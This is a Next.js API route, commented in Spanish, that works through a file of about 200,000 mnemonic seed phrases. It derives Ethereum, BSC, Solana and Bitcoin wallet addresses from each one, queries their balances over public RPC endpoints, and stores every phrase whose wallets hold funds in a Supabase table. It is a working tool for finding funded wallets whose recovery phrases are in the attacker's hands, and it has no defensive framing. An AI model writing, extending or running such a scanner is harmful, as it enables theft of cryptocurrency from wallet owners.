import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';
import { Mnemonic, HDNodeWallet } from 'ethers';
import * as bip39 from 'bip39';
import { derivePath } from 'ed25519-hd-key';
import { Keypair } from '@solana/web3.js';
import { HDKey } from '@scure/bip32';
import { p2wpkh } from 'micro-btc-signer';
import fs from 'fs';
import path from 'path';

export const maxDuration = 60;
export const dynamic = 'force-dynamic';

function getEthAddress(phrase: string): string | null {
  try {
    return HDNodeWallet.fromMnemonic(Mnemonic.fromPhrase(phrase)).address;
  } catch {
    return null;
  }
}

async function getSolAddress(phrase: string): Promise<string | null> {
  try {
    const seed = await bip39.mnemonicToSeed(phrase);
    const derived = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
    return Keypair.fromSeed(derived).publicKey.toBase58();
  } catch {
    return null;
  }
}

async function getBtcAddress(phrase: string): Promise<string | null> {
  try {
    const seed = await bip39.mnemonicToSeed(phrase);
    const hd = HDKey.fromMasterSeed(seed);
    const btcChild = hd.derive("m/84'/0'/0'/0/0");
    if (!btcChild.publicKey) return null;
    return p2wpkh(btcChild.publicKey).address || null;
  } catch {
    return null;
  }
}

// RPC Batch checks
async function checkEthBatch(addresses: string[]): Promise<Record<string, number>> {
  if (!addresses.length) return {};
  const rpcs = [
    'https://ethereum-rpc.publicnode.com',
    'https://rpc.ankr.com/eth',
    'https://cloudflare-eth.com'
  ];
  const payload = addresses.map((addr, i) => ({
    jsonrpc: '2.0', id: i, method: 'eth_getBalance', params: [addr, 'latest']
  }));

  for (const url of rpcs) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        signal: AbortSignal.timeout(6000),
      });
      if (res.ok) {
        const results = await res.json();
        if (Array.isArray(results)) {
          const balances: Record<string, number> = {};
          for (const item of results) {
            const idx = item.id;
            if (item.result) {
              balances[addresses[idx]] = parseInt(item.result, 16) / 1e18;
            } else {
              balances[addresses[idx]] = 0;
            }
          }
          return balances;
        }
      }
    } catch {}
  }
  return Object.fromEntries(addresses.map(a => [a, 0]));
}

async function checkBscBatch(addresses: string[]): Promise<Record<string, number>> {
  if (!addresses.length) return {};
  const rpcs = [
    'https://bsc-rpc.publicnode.com',
    'https://binance.llamarpc.com',
    'https://bsc-dataseed.binance.org'
  ];
  const payload = addresses.map((addr, i) => ({
    jsonrpc: '2.0', id: i, method: 'eth_getBalance', params: [addr, 'latest']
  }));

  for (const url of rpcs) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        signal: AbortSignal.timeout(6000),
      });
      if (res.ok) {
        const results = await res.json();
        if (Array.isArray(results)) {
          const balances: Record<string, number> = {};
          for (const item of results) {
            const idx = item.id;
            if (item.result) {
              balances[addresses[idx]] = parseInt(item.result, 16) / 1e18;
            } else {
              balances[addresses[idx]] = 0;
            }
          }
          return balances;
        }
      }
    } catch {}
  }
  return Object.fromEntries(addresses.map(a => [a, 0]));
}

async function checkSolBatch(addresses: string[]): Promise<Record<string, number>> {
  if (!addresses.length) return {};
  const rpcs = [
    'https://api.mainnet-beta.solana.com',
    'https://solana-rpc.publicnode.com',
    'https://rpc.ankr.com/solana',
    'https://solana.llamarpc.com'
  ];
  const payload = addresses.map((addr, i) => ({
    jsonrpc: '2.0', id: i, method: 'getBalance', params: [addr]
  }));

  for (const url of rpcs) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        signal: AbortSignal.timeout(6000),
      });
      if (res.ok) {
        const results = await res.json();
        if (Array.isArray(results)) {
          const balances: Record<string, number> = {};
          for (const item of results) {
            const idx = item.id;
            if (item.result && item.result.value !== undefined) {
              balances[addresses[idx]] = item.result.value / 1e9;
            } else {
              balances[addresses[idx]] = 0;
            }
          }
          return balances;
        }
      }
    } catch {}
  }
  return Object.fromEntries(addresses.map(a => [a, 0]));
}

async function checkBtcBatch(addresses: string[]): Promise<Record<string, number>> {
  if (!addresses.length) return {};
  const url = `https://blockchain.info/balance?active=${addresses.join(',')}`;
  try {
    const res = await fetch(url, {
      headers: { 'User-Agent': 'Mozilla/5.0' },
      signal: AbortSignal.timeout(6000),
    });
    if (res.ok) {
      const data = await res.json();
      const balances: Record<string, number> = {};
      for (const addr of addresses) {
        if (data[addr]) {
          balances[addr] = (data[addr].final_balance || 0) / 1e8;
        } else {
          balances[addr] = 0;
        }
      }
      return balances;
    }
  } catch {}
  return Object.fromEntries(addresses.map(a => [a, 0]));
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => ({}));
    const batchSize = Math.min(body.batchSize || 25, 50);
    const customPhrases: string[] = body.phrases || [];

    // Cargar estadísticas actuales de Supabase
    const { data: stats } = await supabaseAdmin.from('scan_stats').select('*').eq('id', 'main').single();
    let currentIdx = Number(stats?.processed || 0);
    let foundWalletsCount = Number(stats?.found_wallets || 0);

    let phrasesToScan: string[] = [];

    if (customPhrases.length > 0) {
      phrasesToScan = customPhrases.slice(0, batchSize);
    } else {
      // Buscar semillas en seeds_200k.txt
      const seedFilePath = path.join(process.cwd(), 'seeds_200k.txt');
      if (fs.existsSync(seedFilePath)) {
        const fileContent = fs.readFileSync(seedFilePath, 'utf-8');
        const lines = fileContent.split('\n').map(l => l.trim()).filter(Boolean);
        const totalPhrases = lines.length;
        if (currentIdx >= totalPhrases) {
          currentIdx = 0; // Reiniciar ciclo si llega al final
        }
        phrasesToScan = lines.slice(currentIdx, currentIdx + batchSize);

        await supabaseAdmin.from('scan_stats').upsert({
          id: 'main',
          total_phrases: totalPhrases,
          processed: currentIdx,
          is_running: true,
          updated_at: new Date().toISOString()
        });
      }
    }

    if (phrasesToScan.length === 0) {
      return NextResponse.json({ error: 'No hay frases mnemónicas disponibles' }, { status: 400 });
    }

    // Derivar direcciones
    const validItems: { phrase: string; eth: string; sol: string; btc: string }[] = [];
    for (const phrase of phrasesToScan) {
      if (!bip39.validateMnemonic(phrase)) continue;
      const eth = getEthAddress(phrase);
      const sol = await getSolAddress(phrase);
      const btc = await getBtcAddress(phrase);
      if (eth && sol && btc) {
        validItems.push({ phrase, eth, sol, btc });
      }
    }

    const ethAddrs = [...new Set(validItems.map(v => v.eth))];
    const solAddrs = validItems.map(v => v.sol);
    const btcAddrs = validItems.map(v => v.btc);

    // Consultar saldos en paralelo
    const [ethBals, bscBals, solBals, btcBals] = await Promise.all([
      checkEthBatch(ethAddrs),
      checkBscBatch(ethAddrs),
      checkSolBatch(solAddrs),
      checkBtcBatch(btcAddrs),
    ]);

    const newlyFound: Record<string, unknown>[] = [];
    for (const item of validItems) {
      const eth_bal = ethBals[item.eth] || 0;
      const bsc_bal = bscBals[item.eth] || 0;
      const sol_bal = solBals[item.sol] || 0;
      const btc_bal = btcBals[item.btc] || 0;

      if (eth_bal > 0 || bsc_bal > 0 || sol_bal > 0 || btc_bal > 0) {
        foundWalletsCount++;
        const record = {
          phrase: item.phrase,
          eth_address: item.eth, eth_balance: eth_bal,
          bsc_address: item.eth, bsc_balance: bsc_bal,
          btc_address: item.btc, btc_balance: btc_bal,
          sol_address: item.sol, sol_balance: sol_bal,
        };
        newlyFound.push(record);
        await supabaseAdmin.from('wallet_results').insert([record]);
      }
    }

    const newProcessed = currentIdx + phrasesToScan.length;
    await supabaseAdmin.from('scan_stats').upsert({
      id: 'main',
      processed: newProcessed,
      found_wallets: foundWalletsCount,
      is_running: true,
      updated_at: new Date().toISOString()
    });

    return NextResponse.json({
      success: true,
      processed: newProcessed,
      scanned_batch: phrasesToScan.length,
      found_in_batch: newlyFound.length,
      total_found: foundWalletsCount
    });

  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : 'Internal server error';
    console.error('Scan batch error:', err);
    return NextResponse.json({ error: message }, { status: 500 });
  }
}
